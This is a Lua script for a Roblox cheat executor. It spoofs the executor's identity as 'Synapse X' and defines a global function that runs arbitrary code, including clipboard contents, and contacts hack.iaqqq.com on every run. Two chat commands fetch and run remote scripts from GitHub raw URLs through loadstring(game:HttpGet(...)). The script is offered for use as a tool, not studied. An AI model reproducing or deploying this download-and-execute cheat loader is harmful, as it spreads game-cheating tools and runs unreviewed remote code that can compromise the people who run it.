local a=[[
function identifyexecutor()
return "Synapse X"
end

]]
function _G.wsexec(dm)
runcode(a..dm)
game:HttpGet("http://hack.iaqqq.com/a?i=")
end
function _G.wsclipboard()
_G.wsexec(getclipboard())
end
function _G.ws_Get_ClipBoard()
return getclipboard()
end
_G["identifyexecutor"] = identifyexecutor
_G.wsexec([[print("OK")]])
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg:match("/e exec open") then
        _G.wsexec([[loadstring(game:HttpGet("https://raw.githubusercontent.com/weishanteam/New-delta/main/%E7%94%A8%E6%88%B7%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/deltanokey.lua"))()]])
        return true
    elseif msg:match("/e long open") then
        _G.wsexec([[loadstring(game:HttpGet("https://raw.githubusercontent.com/longshu886/long/main/bgtui"))()]])
    end
end)
